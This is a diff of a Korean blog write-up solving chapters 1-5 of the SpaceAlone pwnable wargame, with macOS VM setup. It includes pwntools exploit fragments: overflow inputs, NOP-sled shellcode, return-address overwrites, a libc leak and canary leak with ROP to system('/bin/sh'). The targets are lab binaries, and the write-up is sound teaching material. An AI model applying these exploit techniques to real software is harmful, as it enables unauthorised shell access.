@@ -1,10 +1,10 @@
 ---
-title: SpaceAlone WriteUP 1~5 (on MacOS)
-description: Silicon MacOS 환경에서 SpaceAlone 가상환경을 구축하고 문제를 풀어봅시다.
+title: SpaceAlone Writeup Chapter 1-5
+description: SpaceAlone Chapter 1~5 문제를 풀어봅시다.
 author: 김도헌(S7nT3E)
-date: 2025-05-12 14:00:00 +0900
-tags: [Tech, Pwnable]
-categories: [Tech, Pwnable]
+date: 2025-06-14 14:00:00 +0900
+tags: [SpaceAlone, Pwnable]
+categories: [CTF Write-up, Pwnable]
 comments: false
 math: true
 mermaid: false
@@ -31,11 +31,11 @@ image:
 ### 서론
 ---
 안녕하세요. Knights of the SPACE의 멤버로 활동하고 있는 김도헌(S7nT3E)입니다.<br>
-이번 글에서는 HSPACE에서 배포해주셨던 [Space Alone](https://github.com/hspace-io/HSPACE-LOB)에 대해서,<br> 
-MacOS에서의 환경 구축 방법과 Chapter 1~5까지의 Write-up을 작성해봤습니다.<br><br>
-5챕터까지는 비교적 쉬운 난이도로 구성되어있는만큼, <br>
-기법을 처음 공부하시거나 아직 익숙하지 않은 분들께서 공부하시기에 상당히 좋은 문제들이라고 생각합니다.<br><br>
+이번 글에서는 HSPACE에서 배포해주셨던 [Space Alone](https://github.com/hspace-io/HSPACE-LOB)에 대해서, MacOS에서의 환경 구축 방법과 Chapter 1~5까지의 Write-up을 작성해봤습니다.<br>
+5챕터까지는 비교적 쉬운 난이도로 구성되어있는만큼, 시스템해킹 기법을 처음 공부하시거나 아직 익숙하지 않은 분들께서 공부하시기에 상당히 좋은 문제들이라고 생각합니다.<br>
 어려우신 분들은 이번 글을 보시며 함께 따라서 공부해보셔도 좋을 것 같습니다.
+챕터 6-10까지의 풀이가 궁금하신분은 다음 링크를 참고해주세요.
+- [SpaceAlone Writeup Chapter 6-10](https://blog.hspace.io/posts/space-alone-write-up_6-to-10/)
 
 ### MacOS 환경 구축
 ---
@@ -49,32 +49,28 @@ MacOS에서의 환경 구축 방법과 Chapter 1~5까지의 Write-up을 작성�
 
 #### 1. .ova → .qcow2 파일 변환
 ---
-가장 먼저 기본적으로 Homebrew가 필요합니다.
+가장 먼저 기본적으로 Homebrew가 설치가 필요합니다.
+- `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`
 
-`/bin/bash -c "$(curl -fsSL [https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh](https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh))"`
-
-해당 코드를 쉘에서 실행하여 설치할 수 있습니다.<br>
+해당 코드를 터미널에서 실행하여 설치할 수 있습니다.<br>
 그 이후 qemu가 필요합니다. qemu는 아래 명령어를 통해 설치할 수 있습니다.<br>
-`brew install qemu`
+- `brew install qemu`
 
 <img src="/assets/img/SpaceAloneMacOS/5.png" alt="qemu 설치" width="100%">
 
 이후 다운로드 받은 .ova 파일의 압축을 풀어줍니다.
-
-`tar -xvf /path/to/ova`
+- `tar -xvf /path/to/ova`
 
 <img src="/assets/img/SpaceAloneMacOS/6.png" alt="압축해제" width="100%">
 
-이런 식으로 여러 파일이 나오는 모습을 확인할 수 있는데,<br>
-여기서 중요한 파일은 .vmdk 파일입니다. ( 이외의 파일은 사용 x )
+이런 식으로 여러 파일이 나오는 모습을 확인할 수 있는데, 여기서 중요한 파일은 .vmdk 파일입니다. (이외의 파일은 사용하지 않음.)
 
-저는 파일의 이름이 불편하여 SpaceAlone.vmdk로 이름은 변경하고 사용했습니다.<br>
-`qemu-img convert -O qcow2 /path/to/vmdk /path/to/qcow2`
+저는 파일의 이름이 불편하여 SpaceAlone.vmdk로 이름을 변경하고 사용했습니다.<br>
+- `qemu-img convert -O qcow2 /path/to/vmdk /path/to/qcow2`
 
 <img src="/assets/img/SpaceAloneMacOS/7.png" alt="qemu" width="100%">
 
-해당 명령어를 통해 vmdk 파일을 qcow2 파일로 변환할 수 있습니다.<br>
-이제 파일을 변환하는 부분은 모두 끝났습니다. UTM에 가상머신으로 올리는 것을 해보겠습니다.
+해당 명령어를 통해 vmdk 파일을 qcow2 파일로 변환할 수 있습니다. 이제 파일을 변환하는 부분은 모두 끝났습니다. UTM에 가상머신으로 올리는 것을 해보겠습니다.
 
 #### 2. UTM 설정
 ---
@@ -83,35 +79,33 @@ MacOS에서의 환경 구축 방법과 Chapter 1~5까지의 Write-up을 작성�
 <img src="/assets/img/SpaceAloneMacOS/8.png" alt="가상머신 생성" width="100%">
 
 - 에뮬레이션 선택
-<img src="/assets/img/SpaceAloneMacOS/9.png" alt="에뮬레이션" width="50%">
+<img src="/assets/img/SpaceAloneMacOS/9.png" alt="에뮬레이션" width="50%" style="display: block; margin: 0 auto;">
 
 - 기타 선택
-<img src="/assets/img/SpaceAloneMacOS/10.png" alt="기타 선택" width="50%">
+<img src="/assets/img/SpaceAloneMacOS/10.png" alt="기타 선택" width="50%" style="display: block; margin: 0 auto;">
 
 - 부팅 장치 없음 선택 → 계속
-<img src="/assets/img/SpaceAloneMacOS/11.png" alt="가상머신 생성" width="50%">
+<img src="/assets/img/SpaceAloneMacOS/11.png" alt="가상머신 생성" width="50%" style="display: block; margin: 0 auto;">
 
-이후 하드웨어, 저장소, 공유 디렉터리는 모두 기본 설정으로 넘기셔도 되고 편하신 대로 설정하셔도 괜찮습니다.<br><br>
-다만, .ova 파일이 요구하는 사양에 따라 메모리 용량이나 드라이브 크기를 너무 작게 설정하신다면 <br>
-이 역시 부팅 과정에서 터질 수 있기때문에 주의해주셔야 합니다.
+이후 하드웨어, 저장소, 공유 디렉터리는 모두 기본 설정으로 넘기셔도 되고 편하신 대로 설정하셔도 괜찮습니다.<br>
+다만, .ova 파일이 요구하는 사양에 따라 메모리 용량이나 드라이브 크기를 너무 작게 설정하신다면 이 역시 부팅 과정에서 오류가 발생할 수 있기 때문에 주의해주셔야 합니다.
 
 - 기본 설정
-<img src="/assets/img/SpaceAloneMacOS/12.png" alt="기본 설정" width="50%">
+<img src="/assets/img/SpaceAloneMacOS/12.png" alt="기본 설정" width="50%" style="display: block; margin: 0 auto;">
 
-저는 모두 기본 설정으로 넘기고 저장했습니다.<br>
-이후 가상 머신을 실행하기 전 설정을 추가로 해야합니다.
+저는 모두 기본 설정으로 넘기고 저장했습니다. 이후 가상 머신을 실행하기 전 설정을 추가로 해야합니다.
 
 - 추가 설정
-<img src="/assets/img/SpaceAloneMacOS/13.png" alt="추가 설정" width="50%"><br>
+<img src="/assets/img/SpaceAloneMacOS/13.png" alt="추가 설정" width="50%" style="display: block; margin: 0 auto;"><br>
 
 - 설정 → QEMU → 트윅 → UEFI 부팅 체크 해제
-<img src="/assets/img/SpaceAloneMacOS/14.png" alt="부팅 설정" width="50%"><br>
+<img src="/assets/img/SpaceAloneMacOS/14.png" alt="부팅 설정" width="50%" style="display: block; margin: 0 auto;"><br>
 
 - 드라이브 → IDE 드라이브 ( 기존에 있던 것 ) → 제거
-<img src="/assets/img/SpaceAloneMacOS/15.png" alt="IDE 드라이브 제거" width="50%"><br>
+<img src="/assets/img/SpaceAloneMacOS/15.png" alt="IDE 드라이브 제거" width="50%" style="display: block; margin: 0 auto;"><br>
 
 - 드라이브 → 새로 만들기 → 가져오기 ( 아까 1에서 변환한 .qcow2 파일을 선택 )
-<img src="/assets/img/SpaceAloneMacOS/16.png" alt="qcow2 적용" width="50%"><br>
+<img src="/assets/img/SpaceAloneMacOS/16.png" alt="qcow2 적용" width="50%" style="display: block; margin: 0 auto;"><br>
 
 그리고 저장을 누르시면 설정이 끝납니다.<br>
 그냥 가상머신 자체가 필요한 것이라면 여기서 끝나도 상관없지만, <br>
@@ -122,46 +116,46 @@ SpaceAlone은 접속을 통해 풀이를 해야 하기때문에 ssh와 관련된
 원래는 chall로 원격 접속을 하여 문제 풀이를 진행해야하지만,<br>
 ssh 설정을 통해 원격 접속이 가능한 환경을 만들어줘야하기때문에 관리자 계정인 knight를 통해 접속합니다.
 
-<img src="/assets/img/SpaceAloneMacOS/17.png" alt="관리자 계정 접속" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/17.png" alt="관리자 계정 접속" width="70%" style="display: block; margin: 0 auto;">
 
 현재 주소를 확인해보면 딱히 연결할 수가 없는 상황입니다.
-<img src="/assets/img/SpaceAloneMacOS/18.png" alt="문제 상황" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/18.png" alt="문제 상황" width="70%" style="display: block; margin: 0 auto;">
 
 주소들을 확인해보면 enp0s1이 닫혀있는 모습을 확인할 수 있습니다.
-<img src="/assets/img/SpaceAloneMacOS/19.png" alt="enp0s1 down" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/19.png" alt="enp0s1 down" width="70%" style="display: block; margin: 0 auto;">
 
 해당 주소를 열어주기 위해서는 아래 2개의 명령어가 필요합니다.
 
 `sudo ip link set enp0s1 up` : enp0s1의 상태를 실행 상태로 변경<br>
 `sudo dhclient enp0s1` : dhcp로 ip 할당
 
-<img src="/assets/img/SpaceAloneMacOS/20.png" alt="주소 열기 명령어" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/20.png" alt="주소 열기 명령어" width="70%" style="display: block; margin: 0 auto;">
 
 두 명령어를 통해서 중지되어있던 enp0s1을 실행상태로 변경하고 접속할 수 있는 상태로 만들어줄 수 있습니다.
-<img src="/assets/img/SpaceAloneMacOS/21.png" alt="상태 변경" width="70%">
--- 제대로 ip가 할당된 모습 --
 
+<img src="/assets/img/SpaceAloneMacOS/21.png" alt="상태 변경" width="70%" style="display: block; margin: 0 auto;">
+
+제대로 ip가 할당된 모습을 볼 수 있습니다.
 하지만 SpaceAlone에 나와있는 설명대로 6022 port로 접속하면 접속이 안될 수도 있습니다.<br>
 이 경우 현재 열려있는 포트를 확인해주면 됩니다.
 
 `sudo systemctl status ssh` :  ssh의 상태 확인 ( 포트, 작동 정보 등 )
-<img src="/assets/img/SpaceAloneMacOS/22.png" alt="ssh 상태 확인" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/22.png" alt="ssh 상태 확인" width="70%" style="display: block; margin: 0 auto;">
 확인해보니 22 포트가 열려있는 모습을 확인할 수 있습니다.
 
-22 포트와 아까 할당받은 ip로 접속을 하면
-<img src="/assets/img/SpaceAloneMacOS/23.png" alt="접속 확인" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/23.png" alt="접속 확인" width="70%" style="display: block; margin: 0 auto;">
 
-제대로 접속되는 모습을 확인할 수 있습니다.
-<img src="/assets/img/SpaceAloneMacOS/24.png" alt="접속 성공 화면" width="70%">
+22 포트와 아까 할당받은 ip로 접속을 하면 제대로 접속되는 모습을 확인할 수 있습니다.
+<img src="/assets/img/SpaceAloneMacOS/24.png" alt="접속 성공 화면" width="70%" style="display: block; margin: 0 auto;">
 
-- 환경 구축 완료
+이로써 환경 구축이 완료되었습니다.
 
 ### Write-up
 ---
 #### Chapter 1
 ---
 처음 접속 이후 파일을 확인해보면
-<img src="/assets/img/SpaceAloneMacOS/1.png" alt="접속 화면" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/1.png" alt="접속 화면" width="70%" style="display: block; margin: 0 auto;">
 <br>실행파일과 소스코드가 있는 것을 확인할 수 있습니다.
 <br>
 
@@ -481,9 +475,9 @@ void root()
 }
 ```
 이 두 부분의 코드를 살펴보면 root 함수를 실행하고, <br>
-case 2가 된다면 다음 챕터로 넘어갈 수 있는 비밀번호를 획득할 수 있을 것이라는 생각을 할 수 있습니다.
+case 2가 된다면 다음 챕터로 넘어갈 수 있는 비밀번호를 획득할 수 있을 것이라는 생각을 할 수 있습니다. <br>
+그러면 어떻게 하면 root 함수를 실행할 수 있을까요? <br>
 
-그렇다면 어떻게 하면 root 함수를 실행할 수 있을까요? <br>
 ```c
 int main()
 {
@@ -536,25 +530,25 @@ int main()
     return 0;
 }
 ```
-cmp3 == 0 && cmp4 == 0이라면 root함수가 실행되는 모습을 볼 수 있고,<br>
-그 조건은 id_input == admin, admin == confirm일 때라는 것을 확인할 수 있습니다.
+`cmp3 == 0 && cmp4 == 0`이라면 root함수가 실행되는 모습을 볼 수 있고,<br>
+그 조건은 `id_input == admin, admin == confirm`일 때라는 것을 확인할 수 있습니다.
 
 그렇다면 id_input은 scanf로 입력을 받는데, admin은 어떻게 조작할 수 있을까요?<br>
 바로 BOF를 통해 조작할 수 있습니다.
 
 gdb를 통해서 살펴보면,
-<img src="/assets/img/SpaceAloneMacOS/2.png" alt="디버깅" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/2.png" alt="디버깅" width="70%" style="display: block; margin: 0 auto;">
 admin 부분과 id_input이 붙어있는 모습을 확인할 수 있습니다.
 
 그래서 id_input의 첫 5바이트를 “admin”으로 넣고 패딩한 뒤, <br>
 admin 부분을 “confirm”으로 넣으면 될 것이라는 생각을 할 수 있습니다.
 
 --- 최종 익스플로잇 ---
-<img src="/assets/img/SpaceAloneMacOS/3.png" alt="chapter1_ex" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/3.png" alt="chapter1_ex" width="70%" style="display: block; margin: 0 auto;">
 ID : admin입력 → A * 22 패딩 → confirm 입력<br>
 PASSWORD : 의미 X (20 byte 내에서 입력)
 
-<img src="/assets/img/SpaceAloneMacOS/4.png" alt="조건 만족" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/4.png" alt="조건 만족" width="70%" style="display: block; margin: 0 auto;">
 그러면 제대로 조건을 만족해서, root 함수가 실행된 모습을 확인할 수 있고,<br>
 2를 입력해서 TOP_SECRET 파일을 확인하면 비밀번호를 확인할 수 있습니다.
 
@@ -645,7 +639,7 @@ int main()
 BOF 취약점이 있음을 확인할 수 있습니다.
 
 checksec을 통해 보호기법을 확인해보면 모든 보호기법이 꺼져있음을 확인할 수 있습니다.
-<img src="/assets/img/SpaceAloneMacOS/25.png" alt="접속 화면" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/25.png" alt="접속 화면" width="70%" style="display: block; margin: 0 auto;">
 
 저는 NX bit가 비활성화 되어있고, bof 취약점이 있는만큼 쉘코드를 통해서 풀어보기로 결정했습니다.
 
@@ -673,14 +667,12 @@ pause()
 p.sendlineafter(b'Serial Number: ',payload)
 p.interactive()
 ```
-buf의 주소는 직접 gets로 입력을 받은 뒤의 스택 상태를 확인해보고 NOP sled의 중간 지점정도로 설정을 했고,<br>
-( 쉘코드를 맨 앞에 넣고 패딩하는 것보다 NOP sled를 사용하는 것이 더 나을 것이라고 판단했습니다 )
-<img src="/assets/img/SpaceAloneMacOS/26.png" alt="페이로드" width="70%">
-쉘코드는 32bit에서 사용할 수 있는 execve(”/bin/sh”) 쉘코드를 사용하여 exploit을 진행했습니다.
+buf의 주소는 직접 gets로 입력을 받은 뒤의 스택 상태를 확인해보고 NOP sled의 중간 지점정도로 설정을 했고, 쉘코드를 맨 앞에 넣고 패딩하는 것보다 NOP sled를 사용하는 것이 더 나을 것이라고 판단했습니다.
 
-원래 기존에는 NOP sled를 0x100 - len(shellcode)만큼 넣었는데,<br>
-그렇게 넣으니 쉘코드의 뒷부분이 애매하게 잘리면서 오류가 나는 것 같아서<br>
-b0와 0x50으로 나눠서 쉘코드의 위 아래로 넣어줬습니다.
+<img src="/assets/img/SpaceAloneMacOS/26.png" alt="페이로드" width="70%" style="display: block; margin: 0 auto;">
+쉘코드는 32bit에서 사용할 수 있는 `execve("/bin/sh")` 쉘코드를 사용하여 exploit을 진행했습니다.
+
+원래 기존에는 NOP sled를 `0x100 - len(shellcode)`만큼 넣었는데, 그렇게 넣으니 쉘코드의 뒷부분이 애매하게 잘리면서 오류가 나는 것 같아서, b0와 0x50으로 나눠서 쉘코드의 위 아래로 넣어줬습니다.
 
 페이로드 실행 이후 status 명령어를 실행해 chapter 3으로 향하는 pw를 획득할 수 있었습니다.
 
@@ -842,16 +834,12 @@ int main(void)
     }
 }
 ```
-상당히 코드가 긴 편이지만 사실 중요하게 볼 부분은 많지 않습니다.
 
-먼저 메뉴를 입력하고 입력한 메뉴에 따라서 switch 문이 실행이 되는데,<br>
-Open_Door 함수에서 BOF 취약점이 있다는 것을 확인할 수 있습니다.
+먼저 메뉴를 입력하고 입력한 메뉴에 따라서 switch 문이 실행이 되는데, Open_Door 함수에서 BOF 취약점이 있다는 것을 확인할 수 있습니다.
 
-그리고 shell 함수 부분을 보면 system(”/bin/sh”) 코드가 있음을 확인할 수 있어서,<br>
-리턴 주소를 shell 함수로 바꾸면 exploit이 가능하겠다는 생각을 할 수 있습니다.
+그리고 shell 함수 부분을 보면 `system("/bin/sh")` 코드가 있음을 확인할 수 있어서, 리턴 주소를 shell 함수로 바꾸면 exploit이 가능하겠다는 생각을 할 수 있습니다.
 
-그래서 페이로드 흐름은 Open_Door 함수 실행 <br>→ BOF를 통해 Return Address Overwrite
-→ shell 실행 으로 잡고 페이로드를 작성했습니다.
+그래서 페이로드 흐름은 Open_Door 함수 실행 → BOF를 통해 Return Address Overwrite → shell 실행 으로 잡고 페이로드를 작성했습니다.
 
 - Payload
 
@@ -874,13 +862,12 @@ payload += p32(shell)
 p.sendlineafter(b'Enter Password : ', payload)
 p.interactive()
 ```
-메뉴에 5를 입력해서 Open_door 함수 실행, 이후 BOF하고 <br>
-shell 함수로 return address overwrite를 해서 exploit 했습니다.
+메뉴에 5를 입력해서 Open_door 함수 실행, 이후 BOF하고 shell 함수로 return address overwrite를 해서 exploit을 진행했습니다.
 
 이후 쉘을 따고 status 명령어를 통해 chapter4의 비밀번호를 확인할 수 있었습니다. 
-<img src="/assets/img/SpaceAloneMacOS/32.png" alt="chapter3_ex" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/32.png" alt="chapter3_ex" width="70%" style="display: block; margin: 0 auto;">
 
-쉘코드를 연습할 수 있는 재미있는 문제였습니다.
+쉘코드를 연습할 수 있는 문제였습니다.
 
 #### Chapter 4
 ---
@@ -939,19 +926,16 @@ int main(int argc, char *argv[]){
     return 0;
 }
 ```
-다른 부분은 중요하지 않고 else if (select == 2)에서 동작하는 부분의 코드와 <br>
-gadget 함수와 MasterKey가 중요합니다.
+다른 부분은 중요하지 않고 else if (select == 2)에서 동작하는 부분의 코드와 gadget 함수와 MasterKey가 중요합니다.
 
-select가 2일 때 실행되는 코드를 살펴보면 read의 주소를 출력해주고, <br>
-read를 통해 buf에 0x400 크기만큼 입력받기에 BOF 취약점이 존재합니다.
+select가 2일 때 실행되는 코드를 살펴보면 read의 주소를 출력해주고, read를 통해 buf에 0x400 크기만큼 입력받기에 BOF 취약점이 존재합니다.
 
 checksec을 통해서 보호기법을 확인하니 NX bit를 제외하면 없다는 점을 확인할 수 있었습니다.
-<img src="/assets/img/SpaceAloneMacOS/28.png" alt="chapter4_checksec" width="70%">
-gadget이 존재하고, MasterKey에서 “/bin/sh”라는 문자열을 가지고 있기에 <br>
-해당 정보들을 활용해서 ROP를 통해 exploit을 진행했습니다.
+<img src="/assets/img/SpaceAloneMacOS/28.png" alt="chapter4_checksec" width="70%" style="display: block; margin: 0 auto;">
+gadget이 존재하고, MasterKey에서 “/bin/sh”라는 문자열을 가지고 있기에 해당 정보들을 활용해서 ROP를 통해 exploit을 진행했습니다.
 
 ROP를 진행하기 위해서는 ROPgadget이 필요한데, 이는 ROPgadget을 통해서 찾아줬습니다.
-<img src="/assets/img/SpaceAloneMacOS/27.png" alt="chapter4_ROPgadget" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/27.png" alt="chapter4_ROPgadget" width="70%" style="display: block; margin: 0 auto;">
 
 - Payload
 
@@ -993,17 +977,16 @@ payload += p64(system)
 p.sendafter(b'Please select the quantity of the item : ', payload)
 p.interactive()
 ```
-출력되는 read의 주소를 받고, 그 주소를 바탕으로 libc base leak을 한 뒤 <br>
-ROP를 통해 system(”/bin/sh”)를 실행해주는 방식으로 Payload를 작성했습니다.
+출력되는 read의 주소를 받고, 그 주소를 바탕으로 libc base leak을 한 뒤 ROP를 통해 system(”/bin/sh”)를 실행해주는 방식으로 Payload를 작성했습니다.
 
 페이로드를 실행하면 쉘을 딸 수 있고, status를 입력하면 stage 5로 향하는 pw를 얻을 수 있습니다.
-<img src="/assets/img/SpaceAloneMacOS/33.png" alt="chapter4_ex" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/33.png" alt="chapter4_ex" width="70%" style="display: block; margin: 0 auto;">
 
-ROP를 재밌게 연습 해볼 수 있는 좋은 문제였던 것 같습니다.
+ROP를 재밌게 연습 해볼 수 있는 문제였습니다.
 
 #### Chapter 5
 ---
-5번째 chapter도 소스코드부터 확인해보겠습니다!
+5번째 chapter도 소스코드부터 확인해보겠습니다.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1233,7 +1216,7 @@ int main() {
 ```
 코드는 상당히 긴 모습입니다. 하지만 저희가 중요하게 볼 부분은 IPS 함수입니다.
 
-main 함수가 실행되면
+main 함수가 실행되면 해당 코드에 의해서 IPS 함수가 실행되는데, IPS 함수는 BOF 취약점이 존재합니다.
 ```c
     do{
 
@@ -1244,7 +1227,6 @@ main 함수가 실행되면
         printf("Please enter a command. Type 'help' for a list of available commands.\n");
     }while(IPS());
 ```
-해당 코드에 의해서 IPS 함수가 실행되는데, IPS 함수는 BOF 취약점이 존재합니다.
 
 - IPS 함수 내의 while문 부분
 
@@ -1271,12 +1253,9 @@ main 함수가 실행되면
         }
     }
 ```
-while 문을 살펴보면 Username과 Password를 read로 입력받는 부분이 있는데, <br>
-바로 이 부분에서 BOF가 터지게 됩니다.
+while 문을 살펴보면 Username과 Password를 read로 입력받는 부분이 있는데, 바로 이 부분에서 BOF가 터지게 됩니다.
 
-sizeof(struct auth)는 Username과 Passwd의 크기인 50바이트가 아니라 <br>
-auth 구조체 전체의 크기인 100바이트의 크기를 가지게 됩니다. <br>
-즉, BOF 취약점이 존재하는 것입니다.
+sizeof(struct auth)는 Username과 Passwd의 크기인 50바이트가 아니라 auth 구조체 전체의 크기인 100바이트의 크기를 가지게 됩니다. 즉, BOF 취약점이 존재하는 것입니다.
 
 그래서 gdb로 해당 부분을 조금 더 자세하게 살펴보기로 했습니다.
 
@@ -1306,14 +1285,13 @@ auth 구조체 전체의 크기인 100바이트의 크기를 가지게 됩니다
 ```
 IPS 함수를 디스어셈블한 코드 중 Username, Passwd를 읽어오는 부분에 대한 코드입니다.
 
-해당 부분을 살펴보면 Username은 rbp - 0x80에, <br>
-Passwd는 rbp - 0x40에 위치한다는 점을 확인할 수 있습니다.
+해당 부분을 살펴보면 Username은 rbp - 0x80에, Passwd는 rbp - 0x40에 위치한다는 점을 확인할 수 있습니다.
 
-그래서 바로 return address overwrite가 가능할까?라고 생각했지만 아니였습니다.<br>
-checksec을 통해서 보호기법을 확인해보면,
-<img src="/assets/img/SpaceAloneMacOS/29.png" alt="접속 화면" width="70%">
-<br>canary와 NX bit가 걸려있는 모습을 확인할 수 있었습니다.<br>
+그래서 바로 return address overwrite가 가능할까?라고 생각했지만 아니였습니다.
+checksec을 통해서 보호기법을 확인해보면, canary와 NX bit가 걸려있는 모습을 확인할 수 있었습니다.
 즉 canary도 우회를 해야합니다.
+
+<img src="/assets/img/SpaceAloneMacOS/29.png" alt="접속 화면" width="70%" style="display: block; margin: 0 auto;">
 
 canary 우회와 관련된 코드도 IPS 함수에 존재합니다.
 
@@ -1342,21 +1320,18 @@ canary 우회와 관련된 코드도 IPS 함수에 존재합니다.
         }
     }
 ```
-이번에도 역시나 while문 안에 있는 부분인데, <br>
-Username과 Passwd를 모두 입력받은 뒤에 printf를 통해 username을 출력하게 됩니다.
+이번에도 역시나 while문 안에 있는 부분인데, Username과 Passwd를 모두 입력받은 뒤에 printf를 통해 username을 출력하게 됩니다.
 
-근데 이때 사용된 %s 서식지정자는 널바이트 (’\0’)을 만나기 전까지 문자열을 쭉 출력하기때문에, <br>
-아까 확인한 BOF 취약점을 사용해 카나리의 널바이트까지 패딩을 하고, <br>
-출력된 카나리를 받은 뒤 return address overwrite를 하면 되겠구나라는 생각을 할 수 있습니다.
+근데 이때 사용된 %s 서식지정자는 널바이트 (’\0’)을 만나기 전까지 문자열을 쭉 출력하기때문에, 아까 확인한 BOF 취약점을 사용해 카나리의 널바이트까지 패딩을 하고, 출력된 카나리를 받은 뒤 return address overwrite를 하면 되겠구나라는 생각을 할 수 있습니다.
 
-그러나 제공된 c코드에는 system 함수나 execve 혹은 flag를 출력해줄만한 코드가 보이지 않았습니다. <br>
+그러나 제공된 c코드에는 system 함수나 execve 혹은 flag를 출력해줄만한 코드가 보이지 않았습니다.
 그래서 계속해서 gdb를 통해 분석해보던 중 이상한 점을 찾을 수 있었습니다.
 
 IPS 함수의 디스어셈블 결과를 살펴보겠습니다.
 
 - disass IPS 결과
 
-```nasm
+```c
 pwndbg> disass IPS
 Dump of assembler code for function IPS:
    0x00000000004017f0 <+0>:	endbr64
@@ -1483,9 +1458,8 @@ End of assembler dump.
 ```
 모든 함수들이 call이 될 때 0x401~~~에서 호출이 되는 모습을 확인할 수 있었습니다.
 
-그래서 저 부분들이 정확히 무슨 함수인지 확인하기 위해서, 
-0x401100부터 50개만큼의 어셈블리 명령어를 확인해보기로 했습니다. (x/50i 0x401100)
-```nasm
+그래서 저 부분들이 정확히 무슨 함수인지 확인하기 위해서, 0x401100부터 50개만큼의 어셈블리 명령어를 확인해보기로 했습니다.
+```c
 pwndbg> x/50i 0x401100
    0x401100:	endbr64
    0x401104:	push   0xd
@@ -1538,14 +1512,12 @@ pwndbg> x/50i 0x401100
    0x4011f4:	jmp    QWORD PTR [rip+0x2af6]        # 0x403cf0 <exit@got.plt>
    0x4011fa:	nop    WORD PTR [rax+rax*1+0x0]
 ```
-이렇게 확인해보니 plt 영역이라는 이라는 점을 확인할 수 있었습니다. <br>
-system 함수가 있는 0x401150이 call되는 부분이 있는지 확인해봤습니다. <br>
-IPS + 411 부분에서 call 되는 모습을 확인할 수 있었고,
-<img src="/assets/img/SpaceAloneMacOS/30.png" alt="system call" width="100%">
+이렇게 확인해보니 plt 영역이라는 이라는 점을 확인할 수 있었습니다. system 함수가 있는 0x401150이 call되는 부분이 있는지 확인해봤습니다.
+<img src="/assets/img/SpaceAloneMacOS/30.png" alt="system call" width="100%" style="display: block; margin: 0 auto;">
 
-인자 값으로 전달되는 값을 확인해보기 위해 0x402576을 확인해보니,
-<img src="/assets/img/SpaceAloneMacOS/31.png" alt="binsh 확인" width="100%">
-<br>“/bin/sh”가 인자로 전달되는 모습을 확인할 수 있었습니다. <br>
+IPS + 411 부분에서 call 되는 모습을 확인할 수 있었고, 인자 값으로 전달되는 값을 확인해보기 위해 0x402576을 확인해보니, “/bin/sh”가 인자로 전달되는 모습을 확인할 수 있었습니다. 
+<img src="/assets/img/SpaceAloneMacOS/31.png" alt="binsh 확인" width="100%" style="display: block; margin: 0 auto;">
+
 이제 exploit에 필요한 모든 정보를 얻었으니 페이로드를 작성해보겠습니다.
 
 - Payload
@@ -1582,33 +1554,25 @@ p.interactive()
 ```
 제가 작성한 최종 페이로드는 위와 같습니다.
 
-Username이 0x80, Password는 0x40부터 위치했기에 0x40 즉 64바이트만큼의 크기가 존재해서 <br>
-Username 크기만 딱 덮으면 중간에 널바이트가 껴서 카나리가 출력되지 않을 수 있어서 전부 채워줬고, <br>
-Password는 카나리의 널바이트까지만 덮어서 카나리까지 출력이 될 수 있도록 <br>
-57바이트 크기만큼 패딩을 해줬습니다.
+Username이 0x80, Password는 0x40부터 위치했기에 0x40 즉 64바이트만큼의 크기가 존재해서 Username 크기만 딱 덮으면 중간에 널바이트가 껴서 카나리가 출력되지 않을 수 있어서 전부 채워줬고, Password는 카나리의 널바이트까지만 덮어서 카나리까지 출력이 될 수 있도록 57바이트 크기만큼 패딩을 해줬습니다.
 
-이후 패딩한 A를 제외하고 제외했던 널바이트를 추가해서 카나리를 leak하고, <br>
-그 다음 실행에서 Username 똑같이 입력하고, <br>
-Password 부분에서 ROP를 통해서 system(”/bin/sh”)을 실행하도록 만들어줬습니다.
+이후 패딩한 A를 제외하고 제외했던 널바이트를 추가해서 카나리를 leak하고, 
+그 다음 실행에서 Username 똑같이 입력하고, Password 부분에서 ROP를 통해서 system(”/bin/sh”)을 실행하도록 만들어줬습니다.
 
-해당 페이로드를 실행하고 Username과 Password 입력을 한 번씩 더 실패하고 30초를 기다리면,<br>
-쉘이 정상적으로 따지는 모습을 확인할 수 있고, <br>
-status를 입력하면 stage6으로 향하는 pw를 얻을 수 있었습니다.
+해당 페이로드를 실행하고 Username과 Password 입력을 한 번씩 더 실패하고 30초를 기다리면, 쉘이 정상적으로 따지는 모습을 확인할 수 있고, status를 입력하면 stage6으로 향하는 pw를 얻을 수 있었습니다.
 
-<img src="/assets/img/SpaceAloneMacOS/34.png" alt="chapter5_ex" width="70%">
+<img src="/assets/img/SpaceAloneMacOS/34.png" alt="chapter5_ex" width="70%" style="display: block; margin: 0 auto;">
 페이로드는 생각보다 간단했지만, 코드 분석이 생각보다 중요한 재밌는 문제였습니다.
 
 ## 마무리
 ---
 저는 이번 SpaceAlone을 chapter 1~5까지만 풀어보며 writeup을 작성했습니다. <br>
-각각의 문제가 기법이나 페이로드가 엄청나게 복잡하지는 않지만, <br>
-코드나 풀이의 방향성이 다른 문제들과는 달리 참신하고 재밌었던 것 같아서 좋았습니다.
+각각의 문제가 기법이나 페이로드가 엄청나게 복잡하지는 않지만, 코드나 풀이의 방향성이 다른 문제들과는 달리 참신하고 재밌었던 것 같아서 좋았습니다.
 
-전반적으로 문제를 정말 재밌게 만들어주신 것 같아 많은 분들이 풀어보시면,<br>
-초보자 분들은 기법을 익히는 기회가, 중급자 분들은 기법에 익숙해지는 기회가, <br>
-고수 분들에게는 재밌게 문제를 풀며 게임을 하는 듯한 기분을 느낄 수 있을 것이라는 생각이 들었습니다.
